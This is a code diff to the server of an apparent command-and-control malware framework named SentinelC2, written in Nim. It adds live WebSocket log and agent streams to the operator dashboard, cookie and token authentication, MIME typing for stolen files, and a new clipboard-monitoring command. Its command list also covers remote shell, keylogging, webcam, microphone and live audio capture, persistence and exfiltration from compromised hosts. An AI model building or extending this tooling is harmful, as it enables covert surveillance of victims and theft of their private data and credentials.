@@ -72,6 +72,13 @@ type
 var agents = initTable[string, AgentSession]()
 var agentsLock: Lock
 
+# Operator WebSocket subscribers: per-agent list of browser sockets
+# that want real-time log push. The dashboard JS opens a WS to
+# /ws/log?agent=<id>; the server adds the socket here, and logLine
+# pushes new lines to all subscribers of that agent.
+var logSubs: Table[string, seq[AsyncSocket]] = initTable[string, seq[AsyncSocket]]()
+var logSubsLock: Lock
+
 # ------------------------------------------------------------
 # ASYNC QUEUE (lock + seq, with optional blocking put for sync callers)
 # ------------------------------------------------------------
@@ -185,18 +192,39 @@ proc logPath(agentId: string): string =
   result = LOGS_DIR / (agentId & ".log")
 
 proc logLine(agentId, line: string) =
+  let ts = now().format("yyyy-MM-dd HH:mm:ss")
+  let formatted = "[" & ts & "] " & line
   try:
     let f = open(logPath(agentId), fmAppend)
     defer: f.close()
-    let ts = now().format("yyyy-MM-dd HH:mm:ss")
-    f.writeLine("[" & ts & "] " & line)
+    f.writeLine(formatted)
   except:
     # last-resort fallback: write to server.log
     try:
       let f = open(SERVER_LOG, fmAppend)
       defer: f.close()
-      f.writeLine("[" & now().format("yyyy-MM-dd HH:mm:ss") & "] log-fail: " & getCurrentExceptionMsg())
+      f.writeLine("[" & ts & "] log-fail: " & getCurrentExceptionMsg())
     except: discard
+  # Push to live operator subscribers. Snapshot the list under the
+  # lock; each send is fire-and-forget so a slow/dead subscriber
+  # can't block the log line. Stale subscribers are cleaned up by
+  # the WS handler when its recv fails.
+  var subs: seq[AsyncSocket] = @[]
+  acquire(logSubsLock)
+  if agentId in logSubs:
+    subs = logSubs[agentId]
+  release(logSubsLock)
+  if subs.len > 0:
+    let payload = cast[seq[byte]]($ %* {
+      "type": "log",
+      "agent": agentId,
+      "ts": ts,
+      "line": line
+    })
+    for sock in subs:
+      try:
+        asyncCheck sock.sendWsFrame(payload)
+      except: discard
 
 # Server-level log: exception traces, web access, X25519 lifecycle.
 # Use this for anything that doesn't fit per-agent logs.
@@ -390,6 +418,7 @@ proc handleAgent(client: AsyncSocket) {.async.} =
     session.key = deriveSessionKey(SECRET, sn, cast[seq[byte]](ourAgentNonce))
 
     withLock agentsLock: agents[agentId] = session
+    pushAgentsUpdate()  # notify operator dashboards of new agent
     echo "[" & BuildPrefix & " +] ", agentId, " registered: ",
          session.hostname, " | ", session.username
     logLine(agentId, "[connect] " & session.hostname & " " &
@@ -473,6 +502,7 @@ proc handleAgent(client: AsyncSocket) {.async.} =
     serverLog("agent handler exception for " & agentId & ": " & getCurrentExceptionMsg())
 
   withLock agentsLock: agents.del(agentId)
+  pushAgentsUpdate()  # notify operator dashboards
   logLine(agentId, "[disconnect]")
   echo "[" & BuildPrefix & " -] ", agentId, " disconnected"
   client.close()
@@ -509,6 +539,8 @@ proc helpText(): string =
            "  upload/up <id> <remotepath> <base64>\n" &
            "  screenshot/ss <id>             - take screenshot\n" &
            "  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp\n" &
+           "  clipwatch <id> [seconds]       - start continuous clipboard monitor (default 1.5s, range 0.5..30) -> downloads/clip_<ts>_<n>.txt\n" &
+           "  unclipwatch <id>               - stop clipboard monitor and report capture count\n" &
            "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
            "  listen <id>                   - start live mic stream -> downloads/mic_live_<ts>.wav (ffplay -infbuf)\n" &
            "  unlisten <id>                 - stop live mic stream and finalize file\n" &
@@ -546,7 +578,8 @@ proc dispatch(line: string): string =
   of "shell", "sh", "download", "dl", "screenshot", "ss", "cam",
      "ps", "clip", "find", "keys", "k", "persist", "p", "killdate",
      "sleep", "kill", "x", "exfil", "recon", "tg", "panic",
-     "mic", "m", "listen", "unlisten":
+     "mic", "m", "listen", "unlisten",
+     "clipwatch", "unclipwatch":
     if p.len < 2: return "Usage: " & p[0] & " <id> [args]\n"
     let cmd = block:
       var c = p[0]
@@ -608,6 +641,15 @@ proc dispatch(line: string): string =
       withLock agentsLock:
         if p[1] in agents:
           agents[p[1]].cmdQueue.add(buildCmd("cam", argStr))
+          return "[" & BuildPrefix & " >] queued for " & p[1]
+        return "[!] not found: " & p[1]
+    elif cmd == "clipwatch":
+      # clipwatch <id> [seconds]  — seconds is optional
+      if p.len < 2: return "Usage: " & p[0] & " <id> [seconds]\n"
+      let argStr = if p.len >= 3: p[2] else: ""
+      withLock agentsLock:
+        if p[1] in agents:
+          agents[p[1]].cmdQueue.add(buildCmd("clipwatch", argStr))
           return "[" & BuildPrefix & " >] queued for " & p[1]
         return "[!] not found: " & p[1]
     elif cmd == "find":
@@ -749,6 +791,7 @@ const DASHBOARD_HTML = """
         <option>screenshot</option>
         <option>cam</option>
         <option>mic</option>
+        <option>clipwatch</option>
         <option>listen</option>
         <option>find</option>
         <option>persist</option>
@@ -973,8 +1016,86 @@ proc apiFiles(req: Request, agentId: string) {.async, gcsafe.} =
     return
   var files: seq[JsonNode] = @[]
   for f in walkFiles(dir / "*"):
-    files.add(%* {"name": f.extractFilename, "size": getFileSize(f)})
+    let fname = f.extractFilename
+    let ext = fname.splitFile.ext.toLowerAscii
+    let mime = case ext
+                of ".bmp": "image/bmp"
+                of ".png": "image/png"
+                of ".jpg", ".jpeg": "image/jpeg"
+                of ".gif": "image/gif"
+                of ".wav": "audio/wav"
+                of ".mp3": "audio/mpeg"
+                of ".mp4": "video/mp4"
+                of ".txt", ".log": "text/plain"
+                of ".json": "application/json"
+                of ".zip": "application/zip"
+                of ".pdf": "application/pdf"
+                else: "application/octet-stream"
+    files.add(%* {
+      "name": fname,
+      "size": getFileSize(f),
+      "mtime": getLastModificationTime(f).toUnix,
+      "mime": mime
+    })
   await jsonResp(req, Http200, $ %* {"files": files})
+
+# /api/state/<id> — combined snapshot: system info, log size,
+# recent files. Used by the dashboard on agent selection for
+# instant initial render, before the WebSocket stream catches up.
+proc apiState(req: Request, agentId: string) {.async, gcsafe.} =
+  # Snapshot the agent under the lock.
+  var host, user, os, priv: string
+  var lastBeat: DateTime
+  var found = false
+  {.cast(gcsafe).}:
+    withLock agentsLock:
+      if agentId in agents:
+        let a = agents[agentId]
+        host = a.hostname
+        user = a.username
+        os = a.osInfo
+        priv = a.privileges
+        lastBeat = a.lastBeacon
+        found = true
+  if not found:
+    await jsonResp(req, Http404, $ %* {"error": "agent not found"})
+    return
+  # Log size (cheap stat).
+  var logSize: int64 = 0
+  let lp = logPath(agentId)
+  if fileExists(lp):
+    logSize = getFileSize(lp)
+  # Recent files (last 20, sorted by mtime desc).
+  var files: seq[JsonNode] = @[]
+  let dir = DOWNLOADS_DIR / agentId
+  if dirExists(dir):
+    var fpaths: seq[tuple[path: string, mtime: Time, size: int64]] = @[]
+    for f in walkFiles(dir / "*"):
+      fpaths.add((f, getLastModificationTime(f), getFileSize(f)))
+    fpaths.sort(proc(a, b: auto): int = cmp(b.mtime, a.mtime))
+    for i in 0..<min(20, fpaths.len):
+      let f = fpaths[i]
+      let fname = f.path.extractFilename
+      let ext = fname.splitFile.ext.toLowerAscii
+      let mime = case ext
+                  of ".bmp": "image/bmp"
+                  of ".wav": "audio/wav"
+                  of ".txt", ".log": "text/plain"
+                  else: "application/octet-stream"
+      files.add(%* {
+        "name": fname, "size": f.size, "mtime": f.mtime.toUnix, "mime": mime
+      })
+  let nowTime = now()
+  let secs = (nowTime - lastBeat).inSeconds
+  let uptime = intToStr(secs div 3600, 2) & ":" &
+               intToStr((secs mod 3600) div 60, 2) & ":" &
+               intToStr(secs mod 60, 2)
+  let body = $ %* {
+    "id": agentId, "hostname": host, "username": user,
+    "os": os, "privileges": priv, "uptime": uptime,
+    "log_size": logSize, "files": files
+  }
+  await jsonResp(req, Http200, body)
 
 proc apiCmd(req: Request) {.async, gcsafe.} =
   try:
@@ -998,21 +1119,172 @@ proc apiCmd(req: Request) {.async, gcsafe.} =
     await jsonResp(req, Http400, $ %* {"ok": false, "error": getCurrentExceptionMsg()})
 
 proc checkAuth(req: Request): bool =
-  # Validate Basic auth on every request. The web dashboard is
-  # operator-only; without this, anyone on the network (Tailscale,
-  # LAN, or anycast via Tailscale Funnel) can control the C2.
+  # Validate Basic auth OR session cookie on every request. Cookie
+  # auth is used for WebSocket upgrade requests (which can't carry
+  # the Authorization header) and is set by Set-Cookie on the
+  # first successful non-WS request.
   let auth = req.headers.getOrDefault("Authorization")
-  if not auth.startsWith("Basic "): return false
-  let cred = auth[6..^1]
-  let dec = base64.decode(cred)
-  let parts = dec.split(':', 1)
-  if parts.len != 2: return false
-  return parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD
+  if auth.startsWith("Basic "):
+    let cred = auth[6..^1]
+    let dec = base64.decode(cred)
+    let parts = dec.split(':', 1)
+    if parts.len == 2 and parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD:
+      return true
+  let cookie = req.headers.getOrDefault("Cookie")
+  if WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE in cookie:
+    return true
+  return false
+
+const WS_COOKIE_NAME = "sc2_sid"
+const WS_COOKIE_VALUE = "sentinel-dashboard-v1"
+let SESSION_HEADERS = newHttpHeaders({
+  "Set-Cookie": WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE &
+                "; Path=/; HttpOnly; SameSite=Strict"
+})
 
 proc requireAuth(req: Request) {.async, gcsafe.} =
   await req.respond(Http401, "unauthorized",
                     newHttpHeaders({"WWW-Authenticate": "Basic realm=\"SentinelC2\"",
                                     "Content-Type": "text/plain"}))
+
+# Validate a token supplied as ?token=<base64 of user:pass> in the URL.
+# (Fallback path — cookies are the primary WS auth mechanism.)
+proc checkAuthToken(query: string): bool =
+  for part in query.split('&'):
+    let kv = part.split('=', 1)
+    if kv.len == 2 and kv[0] == "token":
+      try:
+        let decoded = base64.decode(kv[1])
+        let parts = decoded.split(':', 1)
+        if parts.len == 2:
+          return parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD
+      except: discard
+  return false
+
+# WebSocket log stream handler. The operator's browser opens
+# /ws/log/<id>?token=...; we check the cookie OR the token, upgrade,
+# register as a subscriber, and pump the connection until the
+# client closes it.
+proc wsLogHandler(client: AsyncSocket, agentId: string, query: string, cookie: string) {.async.} =
+  var authed = false
+  if WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE in cookie: authed = true
+  if not authed and not checkAuthToken(query):
+    await client.sendWsFrame(cast[seq[byte]]("{\"error\":\"unauthorized\"}"))
+    client.close(); return
+  if not await wsUpgrade(client):
+    client.close(); return
+  # Register as subscriber.
+  acquire(logSubsLock)
+  if not logSubs.hasKey(agentId): logSubs[agentId] = @[]
+  logSubs[agentId].add(client)
+  release(logSubsLock)
+  # Send a hello so the client knows the stream is live.
+  discard await client.sendWsFrame(cast[seq[byte]](
+    $ %* {"type": "hello", "agent": agentId, "msg": "log stream open"}))
+  # Pump: keep the connection alive, drop on close.
+  try:
+    while true:
+      let frame = await client.recvWsFrame()
+      if frame.len == 0: break
+      # Client-to-server frames are ignored — this is a push channel.
+  except: discard
+  finally:
+    acquire(logSubsLock)
+    if agentId in logSubs:
+      var newList: seq[AsyncSocket] = @[]
+      for s in logSubs[agentId]:
+        if s != client: newList.add(s)
+      logSubs[agentId] = newList
+    release(logSubsLock)
+    try: client.close()
+    except: discard
+
+# WebSocket agents-list stream handler. Pushes a JSON list of agents
+# whenever the set changes (connect/disconnect). The dashboard uses
+# this so the sidebar updates instantly without polling.
+var agentSubs: seq[AsyncSocket] = @[]
+var agentSubsLock: Lock
+
+proc pushAgentsUpdate() =
+  # Build a snapshot under agentsLock, then push to all subscribers.
+  var snap: seq[tuple[id, host, user, os, priv: string, beat: DateTime]] = @[]
+  {.cast(gcsafe).}:
+    withLock agentsLock:
+      for id, a in agents.pairs:
+        snap.add((id, a.hostname, a.username, a.osInfo, a.privileges, a.lastBeacon))
+  var arr = newJArray()
+  let nowTime = now()
+  for s in snap:
+    let secs = (nowTime - s.beat).inSeconds
+    let uptime = intToStr(secs div 3600, 2) & ":" &
+                 intToStr((secs mod 3600) div 60, 2) & ":" &
+                 intToStr(secs mod 60, 2)
+    arr.add(%* {
+      "id": s.id, "hostname": s.host, "username": s.user,
+      "os": s.os, "privileges": s.priv, "uptime": uptime
+    })
+  let payload = cast[seq[byte]]($ %* {
+    "type": "agents",
+    "agents": arr,
+    "uptime_s": (nowTime - bootTime).inSeconds
+  })
+  var subs: seq[AsyncSocket] = @[]
+  acquire(agentSubsLock)
+  subs = agentSubs
+  release(agentSubsLock)
+  for s in subs:
+    try:
+      asyncCheck s.sendWsFrame(payload)
+    except: discard
+
+proc wsAgentsHandler(client: AsyncSocket, query: string, cookie: string) {.async.} =
+  var authed = false
+  if WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE in cookie: authed = true
+  if not authed and not checkAuthToken(query):
+    await client.sendWsFrame(cast[seq[byte]]("{\"error\":\"unauthorized\"}"))
+    client.close(); return
+  if not await wsUpgrade(client):
+    client.close(); return
+  acquire(agentSubsLock)
+  agentSubs.add(client)
+  release(agentSubsLock)
+  # Send a hello + current snapshot.
+  let nowTime = now()
+  var arr = newJArray()
+  var snap: seq[tuple[id, host, user, os, priv: string, beat: DateTime]] = @[]
+  {.cast(gcsafe).}:
+    withLock agentsLock:
+      for id, a in agents.pairs:
+        snap.add((id, a.hostname, a.username, a.osInfo, a.privileges, a.lastBeacon))
+  for s in snap:
+    let secs = (nowTime - s.beat).inSeconds
+    let uptime = intToStr(secs div 3600, 2) & ":" &
+                 intToStr((secs mod 3600) div 60, 2) & ":" &
+                 intToStr(secs mod 60, 2)
+    arr.add(%* {
+      "id": s.id, "hostname": s.host, "username": s.user,
+      "os": s.os, "privileges": s.priv, "uptime": uptime
+    })
+  let helloPayload = cast[seq[byte]]($ %* {
+    "type": "hello",
+    "agents": arr,
+    "uptime_s": (nowTime - bootTime).inSeconds
+  })
+  discard await client.sendWsFrame(helloPayload)
+  try:
+    while true:
+      let frame = await client.recvWsFrame()
+      if frame.len == 0: break
+  except: discard
+  finally:
+    acquire(agentSubsLock)
+    var newList: seq[AsyncSocket] = @[]
+    for s in agentSubs:
+      if s != client: newList.add(s)
+    agentSubs = newList
+    release(agentSubsLock)
+    try: client.close()
+    except: discard
 
 proc webHandler(req: Request) {.async, gcsafe.} =
   # All endpoints (incl. /) require auth. The HTML page itself is
@@ -1030,10 +1302,26 @@ proc webHandler(req: Request) {.async, gcsafe.} =
     await apiAgents(req); return
   if m == HttpGet and url.startsWith("/api/log/"):
     await apiLog(req, url[9..^1]); return
+  if m == HttpGet and url.startsWith("/api/state/"):
+    await apiState(req, url[11..^1]); return
   if m == HttpGet and url.startsWith("/api/files/"):
     await apiFiles(req, url[11..^1]); return
   if m == HttpPost and url == "/api/cmd":
     await apiCmd(req); return
+  if m == HttpGet and url.startsWith("/ws/log/"):
+    # /ws/log/<id>?token=...
+    let rest = url[8..^1]  # strip "/ws/log/"
+    let slash = rest.find('/')
+    let aid = if slash < 0: rest else: rest[0..<slash]
+    let query = if slash < 0: "" else: rest[slash+1..^1]
+    let cookie = req.headers.getOrDefault("Cookie")
+    asyncCheck wsLogHandler(req.client, aid, query, cookie)
+    return
+  if m == HttpGet and url.startsWith("/ws/agents"):
+    let query = if url.contains('?'): url.split('?', 1)[1] else: ""
+    let cookie = req.headers.getOrDefault("Cookie")
+    asyncCheck wsAgentsHandler(req.client, query, cookie)
+    return
   if m == HttpGet and url.startsWith("/downloads/"):
     # /downloads/<id>/<file>
     let rest = url[11..^1]
@@ -1045,7 +1333,15 @@ proc webHandler(req: Request) {.async, gcsafe.} =
     if fname.contains("..") or fname.contains('\\') or fname.contains('/'):
       await req.respond(Http400, "bad filename"); return
     let fpath = DOWNLOADS_DIR / aid / fname
-    await sendWebFile(req, fpath, "application/octet-stream")
+    let ext = fname.splitFile.ext.toLowerAscii
+    let mime = case ext
+                of ".bmp": "image/bmp"
+                of ".png": "image/png"
+                of ".jpg", ".jpeg": "image/jpeg"
+                of ".wav": "audio/wav"
+                of ".txt", ".log": "text/plain; charset=utf-8"
+                else: "application/octet-stream"
+    await sendWebFile(req, fpath, mime)
     return
   await req.respond(Http404, "not found")
 
